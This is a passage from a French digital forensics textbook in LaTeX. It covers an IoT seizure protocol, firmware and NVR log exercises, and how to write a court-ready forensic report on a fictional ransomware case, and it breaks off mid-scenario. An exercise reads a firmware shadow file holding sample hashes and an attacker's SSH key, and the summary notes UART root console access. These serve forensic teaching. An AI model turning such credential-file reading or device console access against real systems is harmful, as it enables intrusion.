\begin{boxPNC}
\textbf{Protocole PNC --- Saisie d'un appareil IoT (routeur, caméra, DVR)}

\begin{enumerate}
    \item \textbf{Ne pas éteindre immédiatement.}
          Photographier l'état des LEDs, des câbles connectés,
          l'écran si présent. Documenter l'IP affichée.
    \item \textbf{Tenter l'accès à l'interface admin} (SSH, web,
          Telnet)~: exporter les logs volatils en priorité.
          Si l'accès échoue~: passer à l'étape~5.
    \item \textbf{Vérifier la synchronisation horaire.}
          Comparer l'heure de l'appareil avec une référence GPS.
          Documenter la dérive exacte (ex.~: ``2026-03-13~14h22
          affiché sur l'appareil~= 14h25 heure GPS, dérive~: +3~min'').
    \item \textbf{Exporter les données volatiles}~: syslog, dmesg,
          table ARP, connexions actives, baux DHCP. Calculer le hash
          SHA-256 de chaque fichier exporté.
    \item \textbf{Couper l'alimentation proprement} (via commande
          \texttt{halt} ou \texttt{poweroff} si possible)~; sinon
          débrancher l'alimentation. Ne jamais appuyer sur le
          bouton reset.
    \item \textbf{Retirer les supports amovibles} (SD Card, USB)
          \emph{avant} de couper l'alimentation~: ils constituent
          des preuves indépendantes.
    \item \textbf{Documenter et sceller~:} étiquette avec N° dossier
          N° evidence, date/heure, OPJ~; sachet antistatique
          (important pour l'électronique).
    \item \textbf{Transport}~: protection antistatique et
          antichoc~; jamais dans le même sachet que d'autres
          appareils électroniques.
\end{enumerate}
\end{boxPNC}

\separateur

\begin{boxresume}
\textbf{Ce qu'il faut retenir de ce chapitre~:}
\begin{itemize}
    \item \textbf{Ne pas éteindre en premier~:} contrairement aux PC,
          les appareils IoT stockent leurs logs principalement en RAM.
          Exporter les logs via l'interface admin \emph{avant} toute
          extinction.

    \item \textbf{Synchronisation horaire obligatoire~:} mesurer la
          dérive de l'horloge IoT par rapport à une référence GPS
          au moment de la saisie~; corriger dans la timeline. Sans
          cette correction, les logs IoT sont inexploitables pour
          la corrélation temporelle.

    \item \textbf{Binwalk~:} outil universel d'analyse de firmware.
          Identifie et extrait les systèmes de fichiers, les images
          compressées, les signatures. \texttt{binwalk -e firmware.bin}
          puis analyser le SquashFS extrait.

    \item \textbf{UART~:} accès console root sur presque tout
          appareil embarqué. Matériel~: adaptateur USB-UART ($\approx$~5~USD).
          Documenter photographiquement avant ouverture du boîtier
          (ACPO Principe~2).

    \item \textbf{DVR/NVR~:} exporter d'abord via interface web~;
          si effacement suspect~: extraire le HDD, image DD avec
          write blocker, carving vidéo avec \texttt{bulk\_extractor}
          ou \texttt{foremost}.

    \item \textbf{Vérifier la synchronisation horaire du NVR~:} une
          dérive de quelques heures invalide la corrélation avec
          les autres sources de la timeline.

    \item \textbf{Contexte camerounais~:} logs DNS des Box opérateurs
          (dnsmasq)~; historique connexions Wi-Fi (table ARP,
          \texttt{hostapd\_events.log})~; toujours compléter par
          réquisition opérateur (art.~57 Loi~2010).

    \item \textbf{Factory reset~:} n'efface pas systématiquement
          la SD Card~; n'efface pas le firmware~; laisse des traces
          dans les logs opérateur. Saisir physiquement avant
          tout reset.
\end{itemize}
\end{boxresume}

\bigskip

\begin{boxexo}[title={\ding{45}\quad Exercice~18.1 --- Priorité de collecte IoT \niveaubase}]
Vous arrivez sur la scène d'un cybercafé de Yaoundé. Un routeur TP-Link
sous OpenWRT est allumé~; l'écran du propriétaire affiche une interface
web indiquant que le routeur est connecté à Internet. Vous suspectez
qu'il a servi de point d'accès pour une fraude en ligne.
\begin{enumerate}[(a)]
    \item Listez vos actions dans l'ordre exact (6~étapes minimum),
          en justifiant chaque priorité par la volatilité des données.
    \item Quelles données exportez-vous en priorité absolue, et
          pourquoi~? Donnez les commandes exactes.
    \item Si le propriétaire tente de réinitialiser le routeur
          pendant que vous l'examinez, que faites-vous~? Quelles
          preuves subsisteraient malgré le reset~?
    \item Calculez et documentez les hachages SHA-256 des
          exports~: à quel moment dans la séquence d'actions~?
\end{enumerate}
\end{boxexo}

\begin{boxexo}[title={\ding{45}\quad Exercice~18.2 --- Analyse firmware \niveaumoyen}]
Le firmware \texttt{mtnbox\_fw\_v3.2.bin} a été extrait d'une MTN Box
saisie. \texttt{binwalk mtnbox\_fw\_v3.2.bin} révèle un SquashFS à
l'offset \texttt{0x20000}. Après extraction~:
\begin{lstlisting}[language=bash_forensique]
cat /mnt/firmware/etc/shadow
# root:$1$salt$abc123defghi:18000:0:99999:7:::
# admin:$1$salt$xyz789uvwxyz:18000:0:99999:7:::

find /mnt/firmware/ -name "authorized_keys"
# /mnt/firmware/root/.ssh/authorized_keys
cat /mnt/firmware/root/.ssh/authorized_keys
# ssh-rsa AAAAB3NzaC1yc2E... root@185.220.XX.XX
\end{lstlisting}
\begin{enumerate}[(a)]
    \item Identifiez les indicateurs de compromission dans ce firmware.
    \item Quel type d'accès la clé SSH autorisée permet-elle~?
          Quelle IP contrôle cette clé (comment le savez-vous)~?
    \item Comment vérifier si ce firmware est une version modifiée
          par rapport au firmware officiel du fabricant~? Quelle
          commande utilisez-vous~?
    \item Rédigez la constatation forensique correspondante, puis
          l'analyse avec niveau de confiance.
\end{enumerate}
\end{boxexo}

\begin{boxexo}[title={\ding{45}\quad Exercice~18.3 --- Timeline IoT multi-sources \niveauexpert}]
Dans l'affaire MBONGO (Chapitre~\ref{chap:custody}), la caméra IP
installée dans le bureau comptabilité de SONATRAV~SA est au c\oe ur
de l'investigation~: elle aurait enregistré MBONGO en train de
manipuler le système de virement. Le NVR Hikvision affiche dans
ses logs~:
\begin{lstlisting}[language=bash_forensique]
[2026-01-15 13:50:22] LOGIN  admin  192.168.5.14  Success
[2026-01-15 13:50:45] PLAYBACK  admin  Camera-Bureau-Compta
                       2026-01-15 12:30 -> 13:00
[2026-01-15 13:51:02] DELETE  admin  Camera-Bureau-Compta
                       2026-01-15 12:00 -> 14:00
[2026-01-15 13:51:08] EXPORT  admin  Camera-Couloir-1
                       2026-01-15 12:00 -> 14:00 -> USB1
\end{lstlisting}
L'heure GPS lors de la saisie du NVR est 14h28. L'heure affichée
sur le NVR est 14h21 (dérive~: --7~minutes).
\begin{enumerate}[(a)]
    \item Corrigez les horodatages NVR pour les aligner sur l'heure
          réelle. Que devient l'horodatage du DELETE~?
    \item Que révèlent les logs NVR sur les intentions de l'auteur~?
          Quelles données ont été supprimées~? Quelles données
          ont été exportées~? Pourquoi cette distinction est-elle
          significative~?
    \item Les enregistrements supprimés (12h00--14h00) sont-ils
          récupérables~? Quelle procédure appliquez-vous~?
    \item L'IP \texttt{192.168.5.14} a accédé au NVR. Comment
          identifier la machine correspondante~? Quelles sources
          corroborent cette identification~?
\end{enumerate}
\end{boxexo}

\bigskip

\begin{boxinfo}
\textbf{Clôture de la Partie~IV.} Ce chapitre clôt la Partie~IV
(Techniques Avancées). Les cinq chapitres de cette partie ont
couvert~: Forensique Système (Ch.~\ref{chap:for-sys}), Forensique
Réseau (Ch.~\ref{chap:for-res}), Forensique Mobile
(Ch.~\ref{chap:for-mob}), Forensique Cloud (Ch.~\ref{chap:for-cloud})
et ce chapitre (IoT/Embarqué).

La \textbf{Partie~V} aborde les contre-mesures~: Anti-Forensique
(Ch.~19~--- techniques d'effacement et obfuscation~; comment les
détecter et les documenter) et les investigations avancées
(Ch.~20--22). La connaissance de l'anti-forensique est indissociable
de la maîtrise des techniques forensiques présentées dans
cette Partie~IV.
\end{boxinfo}

      
        % ============================================================================
% Fichier  : partie4/P04_C19_rapport_forensique.tex
% Titre    : Rédaction du Rapport Forensique
% Auteur   : MINKA MI NGUIDJOÏ Thierry Emmanuel
% Version  : 1.0 -- Juin 2026
% Statut   : RÉDIGÉ
% Sources  : Ch. 8 (custody, admissibilité), Ch. 7 (NIST SP 800-86
%            distinction constatation/analyse), Ch. 12 (droit camerounais,
%            qualification), Ch. 13 (déontologie, témoignage expert)
%            Affaires fil rouge : MBONGO, MVOM, WOURI, ONAMBELE
% Positionnement : Chapitre-synthèse de la Partie IV. Toute l'investigation
%                  technique des chapitres précédents se traduit ici en
%                  document juridiquement opposable. C'est le livrable final
%                  de l'investigateur -- ce que le tribunal reçoit.
% ============================================================================

\chapter{Rédaction du Rapport Forensique}
\label{chap:rapport}

\epigraph{%
    « Un rapport forensique qui ne résiste pas à un contre-interrogatoire
    ne vaut pas mieux qu'une analyse technique jamais documentée. »%
}{--- Principe de la défendabilité forensique}

\niveauChapitre{Intermédiaire}{%
    Chapitres~\ref{chap:custody} (admissibilité) et
    \ref{chap:meth-std} (distinction constatation/analyse)
    indispensables. Ce chapitre synthétise toute la Partie~IV
    en document juridiquement opposable.%
}

\begin{boxobjectifs}
\begin{itemize}
    \item Maîtriser l'architecture en trois niveaux du rapport
          forensique~: synthèse exécutive, rapport technique,
          dossier probatoire.
    \item Appliquer rigoureusement la distinction entre
          \termecle{Constatations} (faits vérifiables) et
          \termecle{Analyse} (interprétations avec niveau de
          confiance).
    \item Structurer chaque section selon les exigences
          d'admissibilité du droit camerounais et les standards
          forensiques internationaux (NIST~SP~800-86).
    \item Rédiger une synthèse exécutive lisible par un magistrat
          sans formation technique.
    \item Anticiper les attaques en contre-interrogatoire et
          structurer les réponses dans le rapport lui-même.
    \item Produire un rapport complet sur le cas MVOM en appliquant
          l'intégralité des techniques présentées dans ce cours.
\end{itemize}
\end{boxobjectifs}

\bigskip

% ============================================================================
\section*{Pourquoi le rapport est le vrai livrable du cours}
% ============================================================================

Toute l'investigation technique des Chapitres~\ref{chap:for-sys}
à~\ref{chap:for-iot} ne produit qu'une chose visible pour le tribunal~:
le rapport forensique. Une analyse brillante mal documentée ne vaut
rien. Un rapport solide sur une analyse modeste peut convain­cre un juge.

Le rapport forensique est le seul contact direct entre votre travail
et la décision judiciaire. C'est aussi le document qui sera scruté
mot à mot par l'avocat de la défense. Ce chapitre traite donc la
rédaction non comme une formalité administrative mais comme
une compétence technique à part entière.

\separateur

% ============================================================================
\section{Architecture en Trois Niveaux}
\label{sec:architecture-rapport}
% ============================================================================

Conformément aux principes du PIU (Ch.~\ref{chap:PIU}, étape~E12) et
aux standards NIST~SP~800-86, le rapport forensique complet comprend
trois niveaux de profondeur correspondant à trois audiences distinctes.

\begin{tableaucours}{p{3.0cm}p{3.5cm}p{5.0cm}}{%
    \tableauHeader{Niveau} &
    \tableauHeader{Audience} &
    \tableauHeader{Contenu et longueur indicative}
}
\textbf{Niveau~1} --- Synthèse Exécutive &
    Magistrat, partie civile, direction &
    2--4~pages. Pas de technique. Conclusions, qualifications, preuves
    clés, recommandations. Compréhensible par un non-technicien. \\
\textbf{Niveau~2} --- Rapport Technique &
    Magistrat, avocat, expert adverse &
    20--100~pages. Méthodologie, constatations horodatées, analyse.
    Chaque affirmation référencée à une preuve. \\
\textbf{Niveau~3} --- Dossier Probatoire &
    Expert adverse, tribunal &
    Annexes~: images E01, logs bruts, captures d'écran, formulaires
    de custody. Référencés depuis le Niveau~2. \\
\end{tableaucours}
\vspace{-0.8em}
\begin{center}{\small\itshape Tableau~19.1 --- Architecture en trois niveaux du rapport forensique}\end{center}

\begin{boiteRemarque}{Rédiger pour le bon destinataire}
Le Niveau~1 est rédigé pour une personne qui ne sait pas ce qu'est
un hash SHA-256. Le Niveau~2 est rédigé pour un technicien
ou un avocat compétent qui \emph{voudra} comprendre la méthode.
Le Niveau~3 est rédigé pour un expert qui \emph{voudra vérifier}
chaque affirmation. Ces trois documents doivent être cohérents~:
la même conclusion doit apparaître dans les trois niveaux, à des
niveaux de détail différents.
\end{boiteRemarque}

% ============================================================================
\section{Règle Fondamentale~: Constatation vs Analyse}
\label{sec:constatation-analyse}
% ============================================================================

La distinction entre \textbf{Constatation} et \textbf{Analyse} est
la règle la plus importante de la rédaction forensique. Issue de
NIST~SP~800-86 (Ch.~\ref{chap:meth-std}), elle protège l'expert
des attaques méthodologiques les plus fréquentes.

\begin{boxdef}
\textbf{Constatation}~: énoncé factuel, objectif, vérifiable
indépendamment par tout technicien utilisant les mêmes outils
sur les mêmes données. Doit pouvoir être confirmé ou infirmé
sans ambiguïté. N'inclut aucune inférence.

\textbf{Analyse}~: interprétation des constatations dans leur
contexte. Comprend obligatoirement~: un niveau de confiance explicite
(élevé / modéré / faible) et les hypothèses alternatives envisagées
et réfutées (E9bis PIU).
\end{boxdef}

\begin{tableaucours}{p{5.5cm}p{5.5cm}}{%
    \tableauHeader{Constatation (correct)} &
    \tableauHeader{Mélange interdit (à éviter)}
}
« Le fichier \texttt{enc\_all.ps1} est présent dans
\texttt{\%TEMP\%} avec un horodatage de création du
13/03/2026~à~02h16:50 selon le \texttt{\$UsnJrnl}. » &
« Le fichier \texttt{enc\_all.ps1} a été placé par l'attaquant
dans \texttt{\%TEMP\%}. » (mélange fait + interprétation) \\
« Le journal Prefetch enregistre une exécution de
\texttt{enc\_all.ps1} à 02h17:44, avec un compteur
d'exécution de~1. » &
« L'attaquant a exécuté le ransomware à 02h17. »
(l'identité de l'attaquant n'est pas dans le Prefetch) \\
« Le \texttt{\$UsnJrnl} enregistre la modification de
847~fichiers \texttt{.docx} entre 02h18:31 et 02h19:02. » &
« L'attaquant a chiffré 847~fichiers en 31~secondes. »
(``chiffré'' est une interprétation~; ``modifié'' est le fait) \\
\end{tableaucours}
\vspace{-0.8em}
\begin{center}{\small\itshape Tableau~19.2 --- Exemples constatation vs mélange interdit}\end{center}

\begin{boxalert}
\textbf{La règle pratique~: le test du ``mais si''}

Avant d'écrire une phrase dans la section Constatations, posez-vous~:
``Mais si je me trompe sur l'interprétation, la phrase est-elle
encore vraie~?''

``\textit{Le fichier enc\_all.ps1 est présent dans \%TEMP\%}''
$\to$ vrai indépendamment de toute interprétation. \textbf{Constatation.}

``\textit{L'attaquant a déposé enc\_all.ps1 dans \%TEMP\%}''
$\to$ suppose que l'auteur du dépôt est identifié. Si l'identification
échoue, la phrase est fausse. \textbf{Analyse, pas constatation.}
\end{boxalert}

% ============================================================================
\section{Structure Détaillée du Rapport Technique (Niveau~2)}
\label{sec:structure-rapport}
% ============================================================================

\subsection{Page de garde et informations administratives}

\begin{lstlisting}[language=bash_forensique,
    caption={Métadonnées obligatoires --- page de garde}]
RAPPORT D'EXPERTISE FORENSIQUE NUMERIQUE
=========================================

Numero de dossier    : DOS-2026-034
Numero de rapport    : REP-DOS-2026-034-v1.0
Date de redaction    : 20 mars 2026
Affaire              : Opération MVOM -- ransomware TRANSBOIS SA

EXPERT :
Nom                  : [Nom Prénom]
Titre/Grade          : OPJ / Expert judiciaire agrée [si applicable]
Matricule            : PNC XXXX-X
Organisme            : DCPJ Douala
Contact              : [email officiel]  [telephone]

COMMETTANT :
Autorité mandante    : Parquet du TGI de Douala
Référence judiciaire : [Numéro de réquisition / ordonnance]
Date de la mission   : 13 mars 2026

EVIDENCE(S) ANALYSEE(S) :
EV-001 : Dell Inspiron 15 SN-GF8T3Y2 (image E01)
         Hash MD5 : a3f7b29c8e1d4f56a2c8b7e3d9f0a142
         Hash SHA-256 : 3d9c8f2b7e4a1c6d5f8e2b9a...
EV-001bis : Dump RAM 16 Go (MBONGO_RAM_20260315.mem)
         Hash SHA-256 : 4e8f3a1b2c9d7e5f6a0b1c2d...

VERSION : v1.0 -- rapport initial
          [v2.0 si rapport complémentaire requis]
\end{lstlisting}

\subsection{Section~1~: Contexte et Mission}

\begin{lstlisting}[language=bash_forensique,
    caption={Section Contexte et Mission --- exemple MVOM}]
1. CONTEXTE ET MISSION
======================

1.1 Contexte factuel
Le 13 mars 2026, TRANSBOIS SA (société d'exploitation forestière,
Douala) a signalé une attaque ransomware ayant paralysé son système
informatique. 847 fichiers de travail ont été rendus inaccessibles.

1.2 Mission
Conformément à la réquisition judiciaire N° [XXX] du Parquet du TGI
de Douala en date du 13 mars 2026, l'expert soussigné a été mandaté
pour :
  (a) Établir les faits techniques liés à l'incident du 13 mars 2026 ;
  (b) Identifier, si possible, l'origine de l'attaque ;
  (c) Évaluer l'étendue des dommages.

1.3 Périmètre et limitations
L'analyse porte exclusivement sur l'evidence EV-001 (image E01 du
serveur compromis) et EV-001bis (dump RAM).
Limitation : la capture réseau contemporaine à l'incident n'était
pas disponible. Les logs de pare-feu MTN pour la période ont été
requis séparément (réquisition N° [YYY] du 14 mars 2026 ; réponse
attendue).
\end{lstlisting}

\subsection{Section~2~: Méthodologie}

\begin{lstlisting}[language=bash_forensique,
    caption={Section Méthodologie --- exemple}]
2. MÉTHODOLOGIE
===============

2.1 Standards appliqués
- ISO/IEC 27037:2012 (collecte et préservation de l'evidence
  numérique)
- NIST SP 800-86 (intégration de la forensique dans la réponse
  aux incidents)
- RFC 3227 (ordre de collecte selon la volatilité)

2.2 Outils utilisés (versions exactes)
| Outil          | Version      | Usage                           |
| FTK Imager     | 4.7.3.81     | Acquisition de l'image E01      |
| Autopsy        | 4.21.0       | Analyse du système de fichiers  |
| Volatility 3   | 2.4.1        | Analyse mémoire RAM             |
| RegRipper      | 20230510     | Analyse du registre Windows     |
| PECmd          | 1.5.0.0      | Analyse des fichiers Prefetch   |
| MFTECmd        | 1.2.2.1      | Analyse du $MFT et $UsnJrnl     |
| log2timeline   | 20230724     | Construction de la timeline     |
| Systeme hôte   | Ubuntu 22.04 | Environnement d'analyse         |

2.3 Intégrité des données
Avant toute analyse, les hash SHA-256 des images E01 ont été
recalculés et comparés aux valeurs enregistrées lors de
l'acquisition (formulaire custody EV-001). Résultat :
CORRESPONDANCE CONFIRMÉE.
\end{lstlisting}

\subsection{Section~3~: Constatations}

La section Constatations est la plus importante du rapport~: elle
constitue la base de toute conclusion judiciaire. Elle ne contient
\textbf{que} des faits vérifiables, horodatés et référencés à une source.

\begin{lstlisting}[language=bash_forensique,
    caption={Section Constatations --- structure et exemple MVOM}]
3. CONSTATATIONS
================

[Structure recommandée : une constatation = un fait = une source]

3.1 État général du système
C.01 : Le système d'exploitation est Windows Server 2022 Standard,
       version 10.0.20348 Build 20348.
       [Source : Volatility 3, windows.info]

C.02 : Le compte utilisateur "admin" a été le dernier compte connecté
       sur ce serveur, avec une session active au moment de
       l'acquisition de la RAM.
       [Source : Volatility 3, windows.logonsessions]

3.2 Activité réseau identifiée
C.03 : Le journal journald enregistre 7 tentatives de connexion SSH
       échouées depuis l'IP 185.220.XX.XX entre 02h13:45 et 02h14:08.
       [Source : journald, extrait en Annexe A, lignes 1247-1253]

C.04 : Le journal journald enregistre une connexion SSH réussie au
       compte "root" depuis l'IP 185.220.XX.XX à 02h14:09.
       [Source : journald, extrait en Annexe A, ligne 1254]

3.3 Fichiers et activité système
C.05 : Le $UsnJrnl enregistre la création du fichier
       "enc_all.ps1" dans C:\Users\admin\AppData\Local\Temp\
       à 02h16:50.
       [Source : MFTECmd, fichier $UsnJrnl, Annexe B]

C.06 : Le journal Prefetch enregistre une exécution de "enc_all.ps1"
       à 02h17:44. Le compteur d'exécution est 1 (première exécution).
       Les fichiers accédés lors de cette exécution incluent
       "encrypted_files_list.txt".
       [Source : PECmd, ENC_ALL.PS1-3F8A2B91.pf, Annexe C]

C.07 : Le $UsnJrnl enregistre la suppression du fichier "enc_all.ps1"
       à 02h18:30.
       [Source : MFTECmd, fichier $UsnJrnl, Annexe B]

C.08 : Le $UsnJrnl enregistre la modification de 847 fichiers
       d'extension ".docx" entre 02h18:31 et 02h19:02. Ces
       fichiers portent désormais l'extension ".locked".
       [Source : MFTECmd, fichier $UsnJrnl, Annexe B]

C.09 : L'analyse Volatility (windows.netscan) révèle une connexion
       TCP en état ESTABLISHED entre 10.0.0.15:49212 et
       185.220.XX.XX:4444 au moment de la capture mémoire.
       [Source : Volatility 3, windows.netscan, Annexe D]
\end{lstlisting}

\subsection{Section~4~: Analyse}

L'analyse interprète les constatations~; elle doit~:
(a)~citer les constatations sur lesquelles elle s'appuie~;
(b)~exprimer un niveau de confiance~;
(c)~mentionner les hypothèses alternatives et pourquoi elles ont été
écartées (E9bis PIU).

\begin{lstlisting}[language=bash_forensique,
    caption={Section Analyse --- exemple MVOM}]
4. ANALYSE
==========

4.1 Chronologie de l'incident (niveau de confiance : ÉLEVÉ)

La convergence temporelle des sources C.03 à C.09 suggère, avec
un niveau de confiance élevé, le scénario suivant :

  [02h13:45 - 02h14:08] L'IP 185.220.XX.XX a procédé à plusieurs
  tentatives d'authentification SSH (C.03), constituant un schéma
  cohérent avec une attaque par force brute.

  [02h14:09] Une connexion SSH réussie a été établie au compte
  root depuis cette IP (C.04). La proximité temporelle (21 secondes
  après la dernière tentative échouée) est cohérente avec un accès
  obtenu par force brute.

  [02h16:50 - 02h17:44] Un script PowerShell nommé "enc_all.ps1"
  a été créé (C.05) puis exécuté (C.06) via la session SSH active.

  [02h18:31 - 02h19:02] 847 fichiers .docx ont été modifiés et
  renommés en .locked (C.08), schéma caractéristique d'un chiffrement
  par ransomware.

4.2 Hypothèse alternative écartée (falsification, E9bis PIU)

H_alt : L'activité observée pourrait être le résultat d'une
opération administrative légitime par l'administrateur système.

Réfutation : (1) L'IP source (185.220.XX.XX) n'appartient pas
au réseau interne de TRANSBOIS SA selon le schéma réseau fourni ;
(2) Aucune fenêtre de maintenance n'était planifiée le 13/03/2026
à 02h00 (attestation TRANSBOIS SA en Annexe E) ; (3) Le script
"enc_all.ps1" n'est pas présent dans les procédures documentées
de TRANSBOIS SA. Cette hypothèse est donc écartée avec un niveau
de confiance élevé.

4.3 Qualification technique

La combinaison accès SSH non autorisé + déploiement de script de
chiffrement + modification massive de fichiers constitue, sur le
plan technique, une intrusion informatique suivie d'une attaque
par ransomware. La qualification juridique de ces faits relève
de l'autorité judiciaire mandante.
\end{lstlisting}

\begin{boxalert}
\textbf{La qualification juridique n'appartient pas à l'expert}

La section~4 de l'exemple ci-dessus se termine par~:
``\textit{La qualification juridique de ces faits relève de
l'autorité judiciaire mandante.}''

Cette formule est obligatoire. L'expert dit ce qu'il a trouvé
et ce que cela signifie techniquement. Il ne dit pas ``c'est
une infraction à l'art.~65 de la Loi~2010/012''. Ce serait
outrepasser sa mission et fragiliser son témoignage.
\end{boxalert}

\subsection{Section~5~: Conclusions et Recommandations}

\begin{lstlisting}[language=bash_forensique,
    caption={Section Conclusions --- synthèse et recommandations}]
5. CONCLUSIONS ET RECOMMANDATIONS
==================================

5.1 Réponses aux questions posées par l'autorité mandante

Q1 : "Établir les faits techniques liés à l'incident."
R1 : Les faits techniques établis sont les suivants [résumé de
     l'analyse 4.1]. Ces faits sont établis avec un niveau de
     confiance élevé, sur la base de la convergence de six sources
     indépendantes (journald, $UsnJrnl, Prefetch, UserAssist,
     Volatility netscan, Volatility filescan).

Q2 : "Identifier l'origine de l'attaque."
R2 : L'IP source identifiée est 185.220.XX.XX. L'attribution de
     cette IP à un individu spécifique nécessite une réquisition
     aux autorités compétentes du pays d'enregistrement de cette IP.
     Cette démarche est hors du périmètre de la présente expertise.

Q3 : "Évaluer l'étendue des dommages."
R3 : 847 fichiers .docx ont été chiffrés et sont actuellement
     inaccessibles. [Évaluation complémentaire de la valeur économique
     des données hors périmètre de cette expertise.]

5.2 Recommandations de sécurité
[À inclure si demandé par le mandant -- ne pas inclure systématiquement
car peut être perçu comme sortant du périmètre judiciaire]

5.3 Réserves
Le présent rapport est établi sur la base des éléments disponibles
à la date de rédaction. Il est susceptible d'être complété si les
logs de pare-feu requis (réquisition N° [YYY]) sont communiqués.
\end{lstlisting}

% ============================================================================
\section{La Synthèse Exécutive (Niveau~1)~: Rédiger pour un Magistrat}
\label{sec:synthese-executive}
% ============================================================================

La synthèse exécutive est lue en premier et détermine si le rapport
sera compris. Elle ne contient aucun terme technique sans définition~;
elle ne référence pas de hash ou de commandes.

\begin{lstlisting}[language=bash_forensique,
    caption={Modèle de synthèse exécutive --- cas MVOM}]
SYNTHÈSE EXÉCUTIVE
==================
(À l'attention du Procureur de la République)

AFFAIRE : Opération MVOM -- Ransomware TRANSBOIS SA
DATE DE L'INCIDENT : 13 mars 2026, entre 02h14 et 02h19
EXPERT : [Nom], [Titre]

L'ESSENTIEL EN TROIS POINTS :

1. UN ACCÈS NON AUTORISÉ A ÉTÉ ÉTABLI
   Dans la nuit du 12 au 13 mars 2026, entre 02h14 et 02h19,
   une personne non autorisée a accédé au système informatique
   de TRANSBOIS SA depuis l'adresse Internet 185.220.XX.XX.
   Cet accès a été obtenu en devinant le mot de passe du
   compte administrateur après plusieurs tentatives.

2. 847 FICHIERS ONT ÉTÉ CHIFFRÉS ET RENDUS INACCESSIBLES
   L'intrus a utilisé un programme malveillant (ransomware)
   pour rendre 847 documents de travail inaccessibles.
   Ces documents portent désormais l'extension ".locked".

3. LES PREUVES SONT SOLIDES ET CONVERGENTES
   Six sources d'information indépendantes (journaux système,
   historique des fichiers, analyse de la mémoire vive)
   convergent vers les mêmes conclusions, avec un niveau de
   confiance élevé.

QUALIFICATION : La qualification juridique des faits relève
de l'autorité judiciaire. L'expert note que les faits techniques
établis correspondent à la description d'un accès informatique
non autorisé suivi d'une atteinte à l'intégrité des données.

PIÈCE CLEF : Le journal [LOGFILE] enregistre l'entrée de
l'intrus à 02h14:09 depuis l'adresse Internet 185.220.XX.XX.
Ce journal est annexé au présent rapport (Annexe A).

POUR ALLER PLUS LOIN : voir Rapport Technique (Niveau 2),
Section 3 (Constatations) et Section 4 (Analyse).
\end{lstlisting}

% ============================================================================
\section{Annexes~: le Dossier Probatoire (Niveau~3)}
\label{sec:dossier-probatoire}
% ============================================================================

Les annexes constituent la preuve que le rapport est vérifiable.
Elles doivent être organisées, référencées et intègres.

\begin{tableaucours}{p{2.5cm}p{4.0cm}p{5.0cm}}{%
    \tableauHeader{Annexe} &
    \tableauHeader{Contenu} &
    \tableauHeader{Format et exigences}
}
\textbf{Annexe~A} & Extraits de logs cités dans les Constatations &
    Texte brut~; horodatages lisibles~; lignes surlignées si nécessaire \\
\textbf{Annexe~B} & Export CSV du \texttt{\$UsnJrnl} filtré &
    CSV~; colonnes~: Timestamp, Filename, Reason~; trié par date \\
\textbf{Annexe~C} & Rapport PECmd (Prefetch) &
    Export CSV ou texte de PECmd \\
\textbf{Annexe~D} & Captures d'écran Volatility &
    PNG horodaté~; commande visible~; résultat complet \\
\textbf{Annexe~E} & Attestation de l'entreprise victime &
    Document signé par le responsable TRANSBOIS~SA \\
\textbf{Annexe~F} & Formulaire de custody EV-001 et EV-001bis &
    Formulaires remplis et signés (Ch.~\ref{chap:custody}) \\
\textbf{Annexe~G} & Hash SHA-256 de toutes les pièces &
    Fichier texte~: SHA-256~<espace>~<nom du fichier>~; signé par l'expert \\
\end{tableaucours}
\vspace{-0.8em}
\begin{center}{\small\itshape Tableau~19.3 --- Organisation des annexes du dossier probatoire}\end{center}

\begin{boiteRemarque}{L'Annexe G~: le hash de toutes les pièces}
L'Annexe~G est la plus importante~: elle est le méta-garant de l'intégrité
de toutes les autres. Elle contient un hash SHA-256 de chaque fichier
annexé au rapport. Si un avocat affirme qu'une pièce a été modifiée,
l'Annexe~G permet de le réfuter immédiatement en recalculant le hash.
Produire l'Annexe~G signée par l'expert au début de l'audience.
\end{boiteRemarque}

% ============================================================================
\section{Pièges de Rédaction et Comment les Éviter}
\label{sec:pieges-redaction}
% ============================================================================

\begin{tableaucours}{p{3.8cm}p{3.5cm}p{4.5cm}}{%
    \tableauHeader{Piège} &
    \tableauHeader{Exemple fautif} &
    \tableauHeader{Formulation correcte}
}
\textbf{Certitude excessive} &
    ``L'attaquant est X.'' &
    ``L'IP source est 185.220.XX.XX. L'attribution à une personne
    physique nécessite des investigations complémentaires.'' \\
\textbf{Jargon non défini} &
    ``Le ransomware a modifié le MFT et les entrées USN.'' &
    ``Les métadonnées de fichier (registre chronologique du système)
    indiquent~\ldots'' puis définir les termes en note de bas de page. \\
\textbf{Conclusion sans preuve} &
    ``L'accès a été obtenu par force brute.'' &
    ``7~tentatives échouées (C.03) suivies d'un succès (C.04)
    constituent un schéma cohérent avec une attaque par force brute~;
    d'autres explications sont théoriquement possibles mais
    n'ont pas été corroborées.'' \\
\textbf{Source non citée} &
    ``Les logs montrent~\ldots'' &
    ``Le journal \texttt{journald} (Annexe~A, lignes 1247--1254)
    enregistre~\ldots'' \\
\textbf{Hypothèse non réfutée} &
    ``Le suspect est coupable.'' &
    Présenter et réfuter explicitement les hypothèses alternatives
    (cf. E9bis PIU). \\
\textbf{Qualif. juridique par l'expert} &
    ``Ce fait constitue une infraction à l'art.~65.'' &
    ``La qualification juridique relève de l'autorité mandante.
    L'expert note que~\ldots'' \\
\end{tableaucours}
\vspace{-0.8em}
\begin{center}{\small\itshape Tableau~19.4 --- Pièges de rédaction et formulations correctes}\end{center}

% ============================================================================
\section{Cas ONAMBELE~: le Rapport Sous Pression}
\label{sec:rapport-pression}
% ============================================================================

\begin{boxscenario}{Affaire ONAMBELE~: quand le rapport est contesté}
L'expert NKENG a remis son rapport sur l'affaire ONAMBELE (fraude
sur les marchés publics). La partie adverse produit une contre-expertise
affirmant que les logs analysés par NKENG pourraient avoir été
manipulés par TRANSBOIS SA \emph{après} l'incident.

L'avocat de la défense pose trois questions en audience~:

\textbf{Q1~:} ``Pouvez-vous prouver que les logs que vous avez
analysés n'ont pas été modifiés par votre client après l'incident~?''

\textbf{R (correcte)~:} ``Les logs ont été exportés depuis l'image
E01 (EV-001) dont les hash SHA-256 ont été calculés lors de
l'acquisition le 13 mars 2026 à 15h03 et sont documentés dans
le formulaire de custody (Annexe~F). La valeur de hash calculée
au moment de l'analyse le 15 mars 2026 est identique (Annexe~G).
Toute modification des logs après l'acquisition aurait changé
le hash et serait détectable. »

\textbf{Q2~:} ``Vous utilisez Volatility 3. N'est-il pas vrai que
ce logiciel modifie lui-même la mémoire pendant la capture~?''

\textbf{R (correcte)~:} « La capture mémoire (EV-001bis) a été
réalisée \emph{avant} toute autre opération sur le système, conformément
à RFC~3227 (ordre de volatilité~: RAM en premier). La modification
